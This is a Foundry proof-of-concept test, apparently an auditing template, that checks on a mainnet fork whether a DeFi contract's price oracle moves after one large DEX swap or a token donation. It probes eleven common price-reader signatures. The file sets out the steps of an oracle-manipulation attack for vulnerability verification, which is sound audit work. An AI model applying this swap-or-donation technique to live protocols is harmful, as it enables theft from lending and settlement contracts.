// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Oracle manipulation (spot price + balance-as-price)
/// @notice Detectors: oracle-spot, balance-as-price. The target prices off
///         a SPOT value (DEX reserves / its own token balance) instead of
///         a TWAP / Chainlink feed. One big swap -- or a plain donation --
///         moves the price, and the target lends / settles / mints at the
///         manipulated price.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. The price VIEW is the guess, so every
///      plausible reader is tried and the result is judged on the
///      OBSERVABLE -- the SAME read returns a DIFFERENT value after one swap
///      or donation -- never on the bare fact that a read returned.

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: DEX router, tokens, and the target's price view.
    address public constant ROUTER = address(0);
    address public constant TOKEN_IN = address(0);
    address public constant TOKEN_OUT = address(0);
    address public constant WHALE = address(0); // holds TOKEN_IN on this fork

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The candidate price readers, by index. `tokenOut` is passed in so the
    /// function stays pure.
    function _readerData(uint8 i, address tokenOut) internal pure returns (bytes memory) {
        if (i == 0) return abi.encodeWithSignature("getPrice()");
        if (i == 1) return abi.encodeWithSignature("latestAnswer()");
        if (i == 2) return abi.encodeWithSignature("latestRoundData()");
        if (i == 3) return abi.encodeWithSignature("price()");
        if (i == 4) return abi.encodeWithSignature("getReserves()");
        if (i == 5) return abi.encodeWithSignature("exchangeRate()");
        if (i == 6) return abi.encodeWithSignature("consult(address,uint256)", tokenOut, uint256(1));
        if (i == 7) return abi.encodeWithSignature("getPrice(address)", tokenOut);
        if (i == 8) return abi.encodeWithSignature("getLatestPrice(address)", tokenOut);
        if (i == 9) return abi.encodeWithSignature("peek()");
        return abi.encodeWithSignature("spot()");
    }

    function _readerName(uint8 i) internal pure returns (string memory) {
        if (i == 0) return "getPrice()";
        if (i == 1) return "latestAnswer()";
        if (i == 2) return "latestRoundData()";
        if (i == 3) return "price()";
        if (i == 4) return "getReserves()";
        if (i == 5) return "exchangeRate()";
        if (i == 6) return "consult(address,uint256)";
        if (i == 7) return "getPrice(address)";
        if (i == 8) return "getLatestPrice(address)";
        if (i == 9) return "peek()";
        return "spot()";
    }

    function _fingerprint(bytes memory data) internal view returns (bool ok, uint256 fp) {
        bytes memory ret;
        (ok, ret) = target.staticcall(data);
        fp = uint256(keccak256(ret));
    }

    /// Try one candidate price reader and accept it only when the OBSERVABLE
    /// changes, never when the read merely returns: the SAME read must return
    /// a DIFFERENT value after the swap/donation. A reader that returns a
    /// fixed value (a real TWAP, a Chainlink feed) is not a finding.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        (bool ok, bytes memory ret) = target.staticcall(data);
        console.log("tried", label, ok ? "read returned" : "read reverted");
        if (ok && uint256(keccak256(ret)) != before) return label;
        return "";
    }

    /// mode 0 = one swap through the router; mode 1 = a plain donation to the
    /// target (balance-as-price).
    function _movePrice(address attacker, uint8 mode) internal {
        if (mode == 0) {
            vm.prank(WHALE);
            IERC20(TOKEN_IN).transfer(attacker, 1000 ether);
            vm.prank(attacker);
            IERC20(TOKEN_IN).approve(ROUTER, 1000 ether);
            address[] memory path = new address[](2);
            path[0] = TOKEN_IN;
            path[1] = TOKEN_OUT;
            vm.prank(attacker);
            IRouter(ROUTER).swapExactTokensForTokens(1000 ether, 0, path, attacker, block.timestamp + 300);
        } else {
            vm.prank(WHALE);
            IERC20(TOKEN_OUT).transfer(attacker, 1000 ether);
            vm.prank(attacker);
            IERC20(TOKEN_OUT).transfer(target, 1000 ether);
        }
    }

    /// Snapshot every reader that works BEFORE the price-moving action, then
    /// move the price, then look for a reader whose value MOVED.
    function _tryEntry(address attacker, uint8 mode) internal returns (string memory used) {
        bool[11] memory worked;
        uint256[11] memory before;
        for (uint8 i = 0; i < 11; i++) {
            (bool ok, uint256 fp) = _fingerprint(_readerData(i, TOKEN_OUT));
            worked[i] = ok;
            before[i] = fp;
        }

        _movePrice(attacker, mode);

        for (uint8 i = 0; i < 11; i++) {
            if (!worked[i]) continue;
            used = _attempt(attacker, before[i], _readerName(i), _readerData(i, TOKEN_OUT));
            if (bytes(used).length > 0) return used;
        }
        return "";
    }

    function test_spotPriceMovedByOneSwap() public {
        require(ROUTER != address(0) && TOKEN_IN != address(0) && TOKEN_OUT != address(0) && WHALE != address(0), "set ROUTER / tokens / WHALE");
        address attackerEOA = makeAddr("attacker");

        string memory used = _tryEntry(attackerEOA, 0);
        console.log("price reader moved by one swap:", used);

        assertTrue(
            bytes(used).length > 0,
            "no spot-price reader reproduced. Tried getPrice(), latestAnswer(), latestRoundData(), price(), getReserves(), exchangeRate(), consult(address,uint256), getPrice(address), getLatestPrice(address), peek(), spot(). This does NOT establish safety: the target may price through a reader under another name or signature, or the swap may not move the exact venue it reads."
        );
    }

    function test_balanceAsPriceMovedByDonation() public {
        require(TOKEN_OUT != address(0) && WHALE != address(0), "set TOKEN_OUT / WHALE");
        address attackerEOA = makeAddr("attacker");

        string memory used = _tryEntry(attackerEOA, 1);
        console.log("price reader moved by donation:", used);

        assertTrue(
            bytes(used).length > 0,
            "no balance-as-price reader reproduced. Tried getPrice(), latestAnswer(), latestRoundData(), price(), getReserves(), exchangeRate(), consult(address,uint256), getPrice(address), getLatestPrice(address), peek(), spot(). This does NOT establish safety: the target may price off its own balance through a reader under another name, or the donation may be routed elsewhere."
        );
    }
}
